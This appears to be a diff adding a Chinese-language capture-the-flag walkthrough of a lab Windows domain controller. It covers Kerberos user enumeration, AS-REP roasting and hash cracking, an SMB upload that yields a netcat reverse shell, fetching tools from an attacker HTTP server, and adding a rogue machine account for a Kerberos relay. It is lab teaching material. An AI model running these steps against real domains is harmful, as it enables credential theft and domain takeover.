@@ -389,8 +389,282 @@ Type "help", "copyright", "credits" or "license" for more information.
 [★]$ cat users.txt
 svc_scan
 xct
+[★]$ ./kerbrute userenum users.txt -d bruno.vl --dc brunodc.bruno.vl
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 03/16/26 - Ronnie Flathers @ropnop
+
+2026/03/16 01:36:54 >  Using KDC(s):
+2026/03/16 01:36:54 >  	brunodc.bruno.vl:88
+
+2026/03/16 01:36:56 >  [+] VALID USERNAME:	 svc_scan@bruno.vl
+2026/03/16 01:36:56 >  Done! Tested 2 usernames (1 valid) in 1.321 seconds
+
+[★]$ netexec ldap brunodc.bruno.vl -u svc_scan -p '' --asreproast svc_scan.asreproast 
+SMB         10.129.8.171    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
+LDAP        10.129.8.171    445    BRUNODC          $krb5asrep$23$svc_scan@BRUNO.VL:d17304f594900970216a5ad51b7ad21a$4abef23dcebc5091b0f0016823d672fba914d9ff22c8bc97232f5a883356877407fef44a18214c08857cecf1e117ce2f0306e4228543ae5bcfc0f94ed7e5f88dc6c69d25ca15dea89c721ee9609f692116585951cbe823a2fcddee95edb8767cd8913bd524eed295d5e01eda6b8f64ae4132eff35168a11d480efb8606cf2a06d5c9a7577ba5675d0ba52875fc299d94fc38afef0400d42f1eb28289c4020cad57d374797ff0ebc84202a0262545cb8ee7088cc401354538591a8846e292854ad434e385bfadb0d1845879c46faf5549164192935eeb07381c8ada513d9e45f9a21e7299
+//svc_scan.asreproast为文件名，真正的攻击技术叫 AS-REP Roasting，把得到的 hash 保存到这个文件
+//流程是：1.客户端请求 TGT  AS-REQ
+//2.域控说：先证明你知道密码
+//3.客户端用 密码加密时间戳 再发一次请求
+//4.域控验证成功才返回：AS-REP ；所以攻击者 拿不到可破解的 hash
+
+//因为关闭了 Kerberos 预认证，所以域控会直接返回 AS-REP
+//Do not require Kerberos preauthentication ；不要求 Kerberos 预身份验证
+//这就变成：离线破解密码
+```
+```
+[★]$ ls /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz 
+/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
+[★]$ cp /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz .
+[★]$ gunzip rockyou.txt.tar.gz
+[★]$ tar -xvf rockyou.txt.tar
+[★]$ hashcat svc_scan.asreproast rockyou.txt
+
+$krb5asrep$23$svc_scan@BRUNO.VL:d17304f594900970216a5ad51b7ad21a$4abef23dcebc5091b0f0016823d672fba914d9ff22c8bc97232f5a883356877407fef44a18214c08857cecf1e117ce2f0306e4228543ae5bcfc0f94ed7e5f88dc6c69d25ca15dea89c721ee9609f692116585951cbe823a2fcddee95edb8767cd8913bd524eed295d5e01eda6b8f64ae4132eff35168a11d480efb8606cf2a06d5c9a7577ba5675d0ba52875fc299d94fc38afef0400d42f1eb28289c4020cad57d374797ff0ebc84202a0262545cb8ee7088cc401354538591a8846e292854ad434e385bfadb0d1845879c46faf5549164192935eeb07381c8ada513d9e45f9a21e7299:Sunshine1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+</SNIP>
+```
+```
+[★]$ netexec ldap brunodc.bruno.vl -u svc_scan -p Sunshine1
+SMB         10.129.8.171    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
+LDAP        10.129.8.171    389    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1
+[★]$ netexec smb brunodc.bruno.vl -u svc_scan -p Sunshine1
+SMB         10.129.8.171    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
+SMB         10.129.8.171    445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1
+[★]$ netexec rdp brunodc.bruno.vl -u svc_scan -p Sunshine1
+RDP         10.129.8.171    3389   BRUNODC          [*] Windows 10 or Windows Server 2016 Build 20348 (name:BRUNODC) (domain:bruno.vl) (nla:True)
+RDP         10.129.8.171    3389   BRUNODC          [+] bruno.vl\svc_scan:Sunshine1
+```
+#### RDP 的“成功”表示凭据正确，但该用户无法连接（如果可以连接，则会显示“已入侵”[“pwned”]）
+### Shell as svc_scan
+```
+[★]$ netexec smb brunodc.bruno.vl -u svc_scan -p Sunshine1 --shares
+SMB         10.129.8.171    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
+SMB         10.129.8.171    445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1
+SMB         10.129.8.171    445    BRUNODC          [*] Enumerated shares
+SMB         10.129.8.171    445    BRUNODC          Share           Permissions     Remark
+SMB         10.129.8.171    445    BRUNODC          -----           -----------     ------
+SMB         10.129.8.171    445    BRUNODC          ADMIN$                          Remote Admin
+SMB         10.129.8.171    445    BRUNODC          C$                              Default share
+SMB         10.129.8.171    445    BRUNODC          CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.129.8.171    445    BRUNODC          IPC$            READ            Remote IPC
+SMB         10.129.8.171    445    BRUNODC          NETLOGON        READ            Logon server share
+SMB         10.129.8.171    445    BRUNODC          queue           READ,WRITE  
+SMB         10.129.8.171    445    BRUNODC          SYSVOL          READ            Logon server share
+```
+#### queue的share为空
+```
+[★]$ smbclient //brunodc.bruno.vl/queue -U 'svc_scan%Sunshine1'
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Mar 16 01:59:12 2026
+  ..                                  D        0  Wed Jun 29 08:41:03 2022
+
+		4980479 blocks of size 4096. 578451 blocks available
+smb: \> put  slip-shell.zip
+putting file slip-shell.zip as \slip-shell.zip (4.8 kb/s) (average 4.8 kb/s)
+smb: \> 
+```
+#### 查看
+```
+[★]$ ftp bruno.vl
+Connected to brunodc.bruno.vl.
+220 Microsoft FTP Service
+Name (bruno.vl:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> cd app
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||52816|)
+125 Data connection already open; Transfer starting.
+06-29-22  05:42PM                  165 changelog
+03-16-26  02:08AM                 9216 hostfxr.dll
+06-28-22  07:15PM                  431 SampleScanner.deps.json
+06-29-22  03:58PM                 7168 SampleScanner.dll
+06-29-22  03:58PM               174592 SampleScanner.exe
+06-28-22  07:15PM                  170 SampleScanner.runtimeconfig.dev.json
+06-28-22  07:15PM                  154 SampleScanner.runtimeconfig.json
+226 Transfer complete.
+ftp> 
+```
+#### 1分钟后收到侦听
+```
+[★]$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.8.171] 52820
+Microsoft Windows [Version 10.0.20348.768]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+bruno\svc_scan
+
+C:\Windows\system32>type ..\..\Users\svc_scan\Desktop\user.txt
+C:\Windows\system32>powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> //查看已有用户和未登录用户
+PS C:\Users> ls
+ls
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         10/4/2024   9:28 PM                Administrator                                                        
+d-r---         9/15/2021   3:12 PM                Public                                                               
+d-----         10/4/2024   9:28 PM                svc_scan                                                             
+
+
+PS C:\Users> net user
+net user
+
+User accounts for \\BRUNODC
+
+-------------------------------------------------------------------------------
+Administrator            Charles.Young            Chloe.Ball               
+Donna.Harrison           Graeme.Grant             Guest                    
+Hugh.Young               Jeremy.Singh             Kayleigh.Patel           
+Kieran.Day               krbtgt                   Natalie.Anderson         
+Sam.Owen                 svc_net                  svc_scan                 
+The command completed successfully.
 
 ```
+### Kerberos Relay(中继)
+```
+PS C:\Users> whoami /all
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeMachineAccountPrivilege     Add workstations to domain     Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+#### 我们可以看到我们拥有“SeMachineAccountPrivilege”权限，但该权限似乎已被禁用。无需过多涉及技术细节，这并不意味着我们无法将计算机添加到域中——该权限看似已禁用，可能是因为我们收到的反向 shell 的会话/令牌存在限制所致。我们拥有此权限这一事实表明，我们的用户或组在组策略中已被定义为允许将计算机添加到域中的。如果不是这种情况，该权限就不会出现。
+#### 所以不管它禁止或禁止，它SeMachineAccountPrivilege 出现了就是允许...
+#### 现在，我们将列出我们的用户能够添加到域中的计算机数量。我们可以通过查询“MachineAccountQuota”属性来实现这一操作。
+https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota
+#### -M maq 是 MachineAccountQuota 模块
+```
+[★]$ netexec ldap brunodc.bruno.vl -u "svc_scan" -p "Sunshine1" -M maq
+SMB         10.129.8.171    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
+LDAP        10.129.8.171    389    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1
+MAQ         10.129.8.171    389    BRUNODC          [*] Getting the MachineAccountQuota
+MAQ         10.129.8.171    389    BRUNODC          MachineAccountQuota: 10 //普通域用户最多可以创建 10 台计算机账户
+```
+#### SeMachineAccountPrivilege 是一个本地权限，目前我们尚未启用该权限。我们可以通过直接向域控制器发送请求（例如使用 LDAP）来消除启用该权限的需求。我们将使用 Sharpmad 来简化这一过程。
+https://github.com/Kevin-Robertson/Sharpmad/tree/main
+```
+[★]$ wget https://raw.githubusercontent.com/Kevin-Robertson/Sharpmad/refs/heads/main/Sharpmad.sln
+[★]$ git clone https://github.com/Kevin-Robertson/Sharpmad.git
+[~/Sharpmad][★]$ ls Sharpmad/
+ADIDNS.cs  App.config  MAQ.cs  Program.cs  Properties  Sharpmad.csproj  Util.cs
+[~/Sharpmad][★]$ zip -r sharpmad.zip Sharpmad
+[~/Sharpmad][★]$ ls
+LICENSE  README.md  Sharpmad  Sharpmad.sln  sharpmad.zip
+[~/Sharpmad][★]$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
+
+```
+```
+PS C:\programdata> powershell wget http://10.10.14.27:8011/Sharpmad.sln -o Sharpmad.sln
+
+PS C:\programdata> powershell wget http://10.10.14.27:8011/sharpmad.zip -o sharpmad.zip
+powershell wget http://10.10.14.27:8011/sharpmad.zip -o sharpmad.zip
+PS C:\programdata> Expand-Archive sharpmad.zip //解压
+
+PS C:\programdata> ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe //生成.exe的默认路径
+ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
+
+
+    Directory: C:\Windows\Microsoft.NET\Framework64\v4.0.30319
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          5/8/2021   8:15 AM         258344 MSBuild.exe                                                          
+
+
+PS C:\programdata> cp C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .
+
+PS C:\programdata> ls sharpmad/sharpmad/Sharpmad.csproj //可以不需要.sln,直接使用.csproj生成.exe
+ls sharpmad/sharpmad/Sharpmad.csproj
+
+
+    Directory: C:\programdata\sharpmad\sharpmad
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         3/16/2026   2:50 AM           2566 Sharpmad.csproj
+
+PS C:\programdata> .\MSBuild.exe sharpmad/sharpmad/Sharpmad.csproj
+
+PS C:\programdata> ls sharpmad/sharpmad/bin/Debug/Sharpmad.exe
+ls sharpmad/sharpmad/bin/Debug/Sharpmad.exe
+
+
+    Directory: C:\programdata\sharpmad\sharpmad\bin\Debug
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         3/16/2026   8:04 AM          53760 Sharpmad.exe   
+
+PS C:\programdata> cp sharpmad/sharpmad/bin/Debug/Sharpmad.exe .
+```
+#### 1).添加了计算机账户 roguecomputer 
+```
+PS C:\programdata> ./Sharpmad.exe MAQ -Action new -MachineAccount roguecomputer -MachinePassword xiaohei
+./Sharpmad.exe MAQ -Action new -MachineAccount roguecomputer -MachinePassword xiaohei
+[+] Machine account roguecomputer added
+```
+#### 既然我们已经拥有了一个由我们掌控的机器账户，那么我们也知道存在一个服务主体，它具有一个服务凭据标识符（SPN）。这使我们能够实施基于 RBCD 的攻击，因为我们拥有一个我们能够掌控的服务主体，它能够执行 S4U 和 S4U2Proxy 请求。
+#### 现在我们可以尝试通过实施一种经典的本地权限提升攻击来实现这一目标，即进行 Kerberos 中继攻击。作为在这一篇简短的帖子中有所说明：
+https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9
+#### Kerberos 中继攻击会在目标的“msDSAllowedToActOnBehalfOfOtherIdentity”属性中添加一个虚假（或被控制）的计算机账户，从而使得对目标实施基于资源的受限委托攻击成为可能。RBCD 攻击的结果是获得针对目标的银色票证访问权限，该权限可用于远程或本地的本地管理员访问（意味着权限提升），可以通过对 Win32 服务控制管理器进行修补来实现本地使用 Kerberos 认证的功能。
+#### 首先，我们需要找到一个可以部署氧化器解析器的端口。氧化器解析器会将请求访问 COM 对象的客户端引导至托管该对象的端口。我们需要这种交互方式，因为为了让 KerbRelay 获得与具有足够权限的账户建立有效会话，以便将我们的计算机添加到 DC$ 的“AllowedToActOnBehalfOfOtherIdentity”属性中，我们需要迫使域控制器“验证”我们所控制的 COM 对象，然后将验证信息转发给域控制器本身，以获取有效的特权会话——在我们的例子中，是一个 LDAP 会话。该工具通过利用强制目标解封装 OBJREF 并解析氧化器编号的 API 来实现这一功能，例如 CoGetInstanceFromIStorage 。我们将使用工具 CheckPort.exe 来找到一个合适的端口，以便部署我们的氧化器解析器。
+https://github.com/cube0x0/KrbRelay
+```
+[★]$ git clone https://github.com/cube0x0/KrbRelay.git //这里要的是Program.cs  
+
+[~/KrbRelay][★]$ ls KrbRelay/
+App.config  IStorage         KrbRelay.csproj.user  packages.config  Smb
+Clients     KrbRelay.crproj  Misc                  Program.cs       Spoofing
+Com         KrbRelay.csproj  obj                   Properties
+[~/KrbRelay][★]$ zip -r KrbRelay.zip KrbRelay
+[~/KrbRelay][★]$ zip -r packages.zip packages
+[~/KrbRelay][★]$ ls
+CheckPort  KrbRelay      KrbRelay.zip  packages.zip
+Images     KrbRelay.sln  packages      README.md
+[~/KrbRelay][★]$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
+```
+https://github.com/Dec0ne/KrbRelayUp
+https://github.com/fortra/impacket
+教程看https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9
+blob:https://app.hackthebox.com/fa96479c-2e00-4d38-b85a-40cfbac86b54
+https://0xdf.gitlab.io/2026/02/24/htb-bruno.html
 
 ----------------------------
 ### 试错
